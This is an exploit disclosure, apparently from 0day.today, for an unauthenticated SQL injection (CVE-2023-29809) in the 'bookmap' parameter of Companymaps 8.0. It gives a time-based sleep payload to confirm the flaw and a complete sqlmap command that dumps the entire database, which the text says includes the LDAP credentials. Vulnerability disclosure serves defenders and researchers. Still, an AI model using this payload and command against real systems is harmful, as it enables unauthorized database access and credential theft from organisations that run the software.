@@ -1,0 +1,53 @@
+id: 38654
+date: 05/04/2023
+title: Companymaps 8.0 SQL Injection Vulnerability
+author: Lucas Noki
+cves: CVE-2023-29809
+
+# Exploit Title: Unauthenticated SQL injection
+
+- Exploit Author: Lucas Noki (0xPrototype)
+- Vendor Homepage: https://github.com/vogtmh
+- Software Link: https://github.com/vogtmh/cmaps
+- Version: 8.0
+- Tested on: Mac, Windows, Linux
+- CVE : CVE-2023-29809
+
+*Description:*
+
+The vulnerability found is an SQL injection. The `bookmap` parameter is vulnerable. When visiting the page: http://192.168.0.56/rest/booking/index.php?mode=list&bookmap=test we get the normal JSON response. However if a single quote gets appended to the value of the `bookmap` parameter we get an error message:
+```html
+<b>Warning</b>: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in <b>/var/www/html/rest/booking/index.php</b> on line <b>152</b><br />
+```
+
+Now if two single quotes get appended we get the normal response without an error. This confirms the opportunity for sql injection. To really prove the SQL injection we append the following payload: 
+```
+'-(select*from(select+sleep(2)+from+dual)a)--+
+```
+
+The page will sleep for two seconds. This confirms the SQL injection.
+
+*Steps to reproduce:*
+
+1. Send the following payload to test the vulnerability: ```'-(select*from(select+sleep(2)+from+dual)a)--+```
+
+2. If the site slept for two seconds run the following sqlmap command to dump the whole database including the ldap credentials.
+   ```shell
+   python3 sqlmap.py -u "http://<IP>/rest/booking/index.php?mode=list&bookmap=test*" --random-agent --level 5 --risk 3 --batch --timeout=10 --drop-set-cookie -o --dump
+   ```
+
+Special thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload.
+
+
+
+## Request to the server:
+
+<img src="Screenshot 2023-04-30 at 22.23.51.png" alt="Screenshot 2023-04-30 at 22.23.51" style="zoom:50%;" />
+
+## Response from the server:
+
+Look at the response time.
+
+<img src="Screenshot 2023-04-30 at 22.24.35.png" alt="Screenshot 2023-04-30 at 22.24.35" style="zoom:50%;" />
+
+#  0day.today [2023-05-08]  #
